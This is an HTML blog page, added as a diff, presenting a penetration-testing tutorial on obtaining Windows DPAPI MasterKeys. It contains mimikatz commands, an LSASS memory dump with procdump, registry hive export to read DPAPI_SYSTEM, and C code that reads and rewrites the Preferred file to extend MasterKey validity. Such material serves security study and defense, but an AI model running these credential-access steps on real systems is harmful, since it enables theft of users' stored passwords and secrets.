@@ -1,0 +1,848 @@
+
+
+<script type="text/javascript" src="http://7u2ss1.com1.z0.glb.clouddn.com/love.js"></script>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+	<script src="http://echarts.baidu.com/dist/echarts.common.min.js"></script>
+	<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+    </style>
+
+
+    
+
+    <title>渗透技巧——获取Windows系统下DPAPI中的MasterKey | </title>
+    <meta name="author" content="wiki">
+    
+    <meta name="description" content="0x00前言
+对于Windows系统，用户的加密数据大都采用DPAPI进行存储，而想要解密这些数据解，必须要获得DPAPI对应的MasterKey。本文将会介绍在获得了Windows系统的权限后获得MasterKey的方法，同时分析Preferred文件格式，延长MasterKey的有效期
+0x01">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="渗透技巧——获取Windows系统下DPAPI中的MasterKey"/>
+    <meta property="og:site_name" content="wiki"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="wiki" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/lastest.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+</head>
+
+<style>
+
+</style>
+<body style="background-color:#2196f3">
+
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+    <script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.15.0/TweenMax.min.js"></script>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo darken-1">
+    
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">wiki</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-2" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://p4gdp8beq.bkt.clouddn.com/timgsi1.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">wiki</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-2" id="category-menu">
+    
+
+            
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+<div class="container main-container">
+    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo darken-2">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+	<!-- 添加渲染 -->
+	<div id="toc" class="toc-article">
+		<strong class="toc-title"></strong>
+	</div> 
+        <div class="card-content">
+		  
+			
+            
+
+            <div class="article-title">
+                
+    
+        <h1>渗透技巧——获取Windows系统下DPAPI中的MasterKey</h1>
+    
+
+
+            </div>
+            <time class="red-link-context" datetime="2018-05-25T13:03:44.904Z"><a href="">2018-05-25</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+
+            <div class="toc red-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x00前言"><span class="section table-of-contents-text">0x00前言</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x01-简介"><span class="section table-of-contents-text">0x01 简介</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x02-基本概念"><span class="section table-of-contents-text">0x02 基本概念</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#DPAPI："><span class="section table-of-contents-text">DPAPI：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#Master-Key："><span class="section table-of-contents-text">Master Key：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#Master-Key-file："><span class="section table-of-contents-text">Master Key file：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#Preferred文件："><span class="section table-of-contents-text">Preferred文件：</span></a></li></ol></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x03-获得MasterKey的方法"><span class="section table-of-contents-text">0x03 获得MasterKey的方法</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、在线获取"><span class="section table-of-contents-text">1、在线获取</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、离线读取"><span class="section table-of-contents-text">2、离线读取</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#思路一："><span class="section table-of-contents-text">思路一：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#思路二："><span class="section table-of-contents-text">思路二：</span></a></li></ol></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x04-解析Preferred文件"><span class="section table-of-contents-text">0x04 解析Preferred文件</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x05-修改MasterKey失效时间"><span class="section table-of-contents-text">0x05 修改MasterKey失效时间</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x06-小结"><span class="section table-of-contents-text">0x06 小结</span></a></li></ol>
+</div>
+
+
+            <div class="entry red-link-context">
+                <script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><hr>
+<p>对于Windows系统，用户的加密数据大都采用DPAPI进行存储，而想要解密这些数据解，必须要获得DPAPI对应的MasterKey。本文将会介绍在获得了Windows系统的权限后获得MasterKey的方法，同时分析Preferred文件格式，延长MasterKey的有效期</p>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr>
+<p>本文将要介绍以下内容</p>
+<ul>
+<li>基本概念</li>
+<li>获得MasterKey的方法</li>
+<li>解析Preferred文件</li>
+<li>修改MasterKey失效时间</li>
+</ul>
+<h2 id="0x02-基本概念"><a href="#0x02-基本概念" class="headerlink" title="0x02 基本概念"></a>0x02 基本概念</h2><hr>
+<h4 id="DPAPI："><a href="#DPAPI：" class="headerlink" title="DPAPI："></a>DPAPI：</h4><p>全称Data Protection Application Programming Interface</p>
+<p>作为Windows系统的一个数据保护接口被广泛使用</p>
+<p>主要用于保护加密的数据，常见的应用如：</p>
+<ul>
+<li>EFS文件加密</li>
+<li>存储无线连接密码</li>
+<li>Windows Credential Manager</li>
+<li>Internet Explorer</li>
+<li>Outlook</li>
+<li>Skype</li>
+<li>Windows CardSpace</li>
+<li>Windows Vault</li>
+<li>Google Chrome</li>
+</ul>
+<h4 id="Master-Key："><a href="#Master-Key：" class="headerlink" title="Master Key："></a>Master Key：</h4><p>64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中</p>
+<h4 id="Master-Key-file："><a href="#Master-Key-file：" class="headerlink" title="Master Key file："></a>Master Key file：</h4><p>二进制文件，可使用用户登录密码对其解密，获得Master Key</p>
+<p>分为两种：</p>
+<ul>
+<li>用户Master Key file，位于%APPDATA%\Microsoft\Protect\%SID%</li>
+<li>系统Master Key file，位于%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User</li>
+</ul>
+<h4 id="Preferred文件："><a href="#Preferred文件：" class="headerlink" title="Preferred文件："></a>Preferred文件：</h4><p>位于Master Key file的同级目录，显示当前系统正在使用的MasterKey及其过期时间，默认90天有效期</p>
+<h2 id="0x03-获得MasterKey的方法"><a href="#0x03-获得MasterKey的方法" class="headerlink" title="0x03 获得MasterKey的方法"></a>0x03 获得MasterKey的方法</h2><hr>
+<p>本节主要介绍通过mimikatz获得MasterKey的方法</p>
+<h3 id="1、在线获取"><a href="#1、在线获取" class="headerlink" title="1、在线获取"></a>1、在线获取</h3><p>通过读取Lsass进程信息，获取当前系统中的MasterKey，能获得多个Master Key file对应的MasterKey</p>
+<p>管理员权限：</p>
+<pre><code>privilege::debug
+sekurlsa::dpapi
+</code></pre><p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-1.png" alt="Alt text"></p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-2.png" alt="Alt text"></p>
+<h3 id="2、离线读取"><a href="#2、离线读取" class="headerlink" title="2、离线读取"></a>2、离线读取</h3><h4 id="思路一："><a href="#思路一：" class="headerlink" title="思路一："></a>思路一：</h4><p>使用procdump dump出LSASS进程内存</p>
+<p>管理员权限：</p>
+<pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre><p>使用mimikatz加载dmp文件并获取各个Master Key file对应的MasterKey：</p>
+<pre><code>sekurlsa::minidump lsass.dmp
+sekurlsa::dpapi
+</code></pre><h4 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h4><p>参考资料：</p>
+<p><a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials</a></p>
+<p>1、复制注册表文件</p>
+<p>管理员权限：</p>
+<pre><code>reg save HKLM\SYSTEM SystemBkup.hiv
+reg save HKLM\SECURITY SECURITY.hiv
+</code></pre><p>2、从注册表文件中获得DPAPI_SYSTEM</p>
+<pre><code>mimikatz log &quot;lsadump::secrets /system:SystemBkup.hiv /security:SECURITY.hiv&quot;
+</code></pre><p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-3.png" alt="Alt text"></p>
+<p>DPAPI_SYSTEM中的user hash为<code>c2872cf6d6d4db31c6c8d33beb49b482e78e7ce3</code>，能够用来解密位于<code>%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User</code>下的系统Master Key file</p>
+<p>3、解密系统Master Key file，获得MasterKey</p>
+<pre><code>mimikatz &quot;dpapi::masterkey /in:C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\04ece708-132d-4bf0-a647-e3329269a012 /system:c2872cf6d6d4db31c6c8d33beb49b482e78e7ce3&quot;
+</code></pre><p>解密获得MasterKey为<code>3e9d7f32f2e57933ead318d075efc82325697d87d992b626a20abb5f0ffba6f073d282a837b6fa058ecff36039aa944e04b3dfb666ebace44aad6bff8789ca43</code></p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-4.png" alt="Alt text"></p>
+<h2 id="0x04-解析Preferred文件"><a href="#0x04-解析Preferred文件" class="headerlink" title="0x04 解析Preferred文件"></a>0x04 解析Preferred文件</h2><hr>
+<p>位于Master Key file的同级目录，显示当前系统正在使用的MasterKey file及其过期时间</p>
+<p>格式如下：</p>
+<pre><code>typedef struct _tagPreferredMasterKey
+{
+    GUID guidMasterKey;
+    FILETIME ftCreated;
+} PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;
+</code></pre><p>例如<code>C:\Users\b\AppData\Roaming\Microsoft\Protect\S-1-5-21-2884853959-2080156797-250722187-1002\Preferred</code></p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-1.png" alt="Alt text"></p>
+<p>前16字节<code>F6 B0 11 A1 D7 B4 C8 40 B5 36 67 2A 82 88 B9 58</code>对应guid，调整格式后，对应文件为<code>a111b0f6-b4d7-40c8-b536-672a8288b958</code></p>
+<p>后8字节<code>D0 08 9F 7D 11 EC D3 01</code>对应过期时间</p>
+<p>对于表示时间的FILETIME，格式如下：</p>
+<pre><code>typedef struct _FILETIME {  
+                          DWORD dwLowDateTime;  
+                          DWORD dwHighDateTime;  
+} FILETIME, *PFILETIME;
+</code></pre><p>想要显示成日常使用的时间格式，需要将FILETIME类型转成SYSTEMTIME类型</p>
+<p>在程序实现上，还需要注意使用sscanf_s函数将字符串转换为DWORD格式</p>
+<p>可供参考的C代码如下：</p>
+<pre><code>#include &lt;windows.h&gt;
+
+int main(void)  
+{  
+    FILE *fp;  
+    unsigned char buf[24];
+    fopen_s(&amp;fp,&quot;Preferred&quot;,&quot;rb&quot;);  
+    fread(buf,1,24,fp);
+    printf(&quot;Data: &quot;);
+    for(int i=0;i&lt;24;i++)
+    {
+        printf(&quot;%02x&quot;,buf[i]);
+    }
+    fclose(fp);
+
+    printf(&quot;\nguidMasterKey: %02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x\n&quot;,buf[3],buf[2],buf[1],buf[0],buf[5],buf[4],buf[7],buf[6],buf[8],buf[9],buf[10],buf[11],buf[12],buf[13],buf[14],buf[15]);
+
+    char lowDateTime[9],highDateTime[9];
+    sprintf_s(lowDateTime,9,&quot;%02X%02X%02X%02X&quot;,buf[19],buf[18],buf[17],buf[16]);
+    sprintf_s(highDateTime,9,&quot;%02X%02X%02X%02X&quot;,buf[23],buf[22],buf[21],buf[20]);
+
+    printf(&quot;dwLowDateTime:%s\n&quot;,lowDateTime);
+    printf(&quot;dwHighDateTime:%s\n&quot;,highDateTime);
+
+    FILETIME        ftUTC;
+    SYSTEMTIME      stUTC2;
+    sscanf_s(lowDateTime,&quot;%x&quot;,&amp;ftUTC.dwLowDateTime);
+    sscanf_s(highDateTime,&quot;%x&quot;,&amp;ftUTC.dwHighDateTime);
+    FileTimeToSystemTime(&amp;ftUTC, &amp;stUTC2);  
+    printf(&quot;&quot;);
+    printf(&quot;Expiry time: %d-%d-%d %d:%d:%d\n&quot;, stUTC2.wYear, stUTC2.wMonth, stUTC2.wDay, stUTC2.wHour, stUTC2.wMinute, stUTC2.wSecond);  
+
+    return 0;  
+} 
+</code></pre><p><strong>注：</strong></p>
+<p>也可以使用fread读取int型数据来解决字符串倒序的问题</p>
+<p>读取Preferred文件，解析出当前系统正在使用的Master Key file的guid和过期时间</p>
+<p>测试如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-2.png" alt="Alt text"></p>
+<h2 id="0x05-修改MasterKey失效时间"><a href="#0x05-修改MasterKey失效时间" class="headerlink" title="0x05 修改MasterKey失效时间"></a>0x05 修改MasterKey失效时间</h2><hr>
+<p>修改思路：</p>
+<p>输入过期时间，将过期时间转为FILETIME格式，替换Preferred文件的FILETIME</p>
+<p>可供参考的c代码如下：</p>
+<pre><code>#include &lt;windows.h&gt;  
+int main(void)  
+{  
+    SYSTEMTIME st={0};
+    FILETIME   ft={0};
+    printf(&quot;[+]Start to change expiry time...\n&quot;);    
+    st.wYear = 2019;
+    st.wMonth = 12;
+    st.wDay = 30;
+    st.wHour = 12;
+    st.wMinute = 30;
+    st.wSecond = 30;
+    printf(&quot;[+]New expiry time:%d-%d-%d %d:%d:%d\n&quot;, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
+    SystemTimeToFileTime(&amp;st,&amp;ft);
+    printf(&quot;dwLowDateTime:%08x\n&quot;,ft.dwLowDateTime);
+    printf(&quot;dwHighDateTime:%08x\n&quot;,ft.dwHighDateTime);
+
+    FILE *fp;  
+    fopen_s(&amp;fp,&quot;Preferred&quot;,&quot;rb+&quot;);  
+    fseek(fp,16,SEEK_SET);
+    fwrite(&amp;ft.dwLowDateTime,sizeof(int),1,fp);
+    fwrite(&amp;ft.dwHighDateTime,sizeof(int),1,fp);
+    fclose(fp);
+    printf(&quot;[+]Change success.\n&quot;);
+    return 0;  
+} 
+</code></pre><p>读取Preferred文件，将过期时间设置为<code>2019-12-30 12:30:30</code></p>
+<p>修改后重新读取Preferred文件信息，成功修改，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-3.png" alt="Alt text"></p>
+<h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr>
+<p>本文总结了在获得了Windows系统的权限后获得MasterKey的方法，编写程序自动分析Preferred文件格式并延长MasterKey的有效期</p>
+<hr>
+<p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>
+
+                
+<p class="red-link-context">
+    <a href="8eed51f1.html" rel="next" title="域渗透——获得域控服务器的NTDS.dit文件">
+    上一篇：域渗透——获得域控服务器的NTDS.dit文件
+  </a>
+</p>
+
+
+
+<p class="red-link-context">
+    <a href="57862677.html" rel="next" title="渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码">
+    下一篇：渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+	
+</article>
+
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style_32x32">
+	<a class="jiathis_button_qzone"></a>
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_tqq"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_renren"></a>
+	<a href="http://www.jiathis.com/share?uid=2157721" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code_mini/jia.js?uid=2157721" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+<!-- ������City�氲װ���� -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zNDIxOS8xMDc1Nw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> Ϊ����ʹ�����������۹����뼤��JavaScript</noscript>
+</div>
+<!-- City�氲װ��������� -->
+
+ 
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large red">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect brown" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse indigo"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>	
+  </div>
+	
+    </main>
+    
+  
+
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/jquery.min.js"></script>
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/spig.js"></script>
+<link rel="stylesheet" href="http://imagestp.cfyqy.com/cfyqy/pet/css/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+<div >
+<!--小人只在首页显示 start*-->
+<div id="spig" class="spig">
+    <div id="message">正在加载中……</div>
+    <div id="mumu" class="mumu"></div>
+</div>
+</div>
+<!--小人end*-->
+ 
+<footer class="page-footer indigo darken-1 darken-1">
+	
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+           
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+    <div class="footer-copyright red-link-context">
+        <div class="container">
+            © just do !
+        </div>
+    </div>
+	
+</footer>
+
+	
+
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>
+  <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass(' lighten-2');
+
+            
+            // 添加new标签
+            $('.menu-reading, .menu-about').append('<span class="new badge red"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
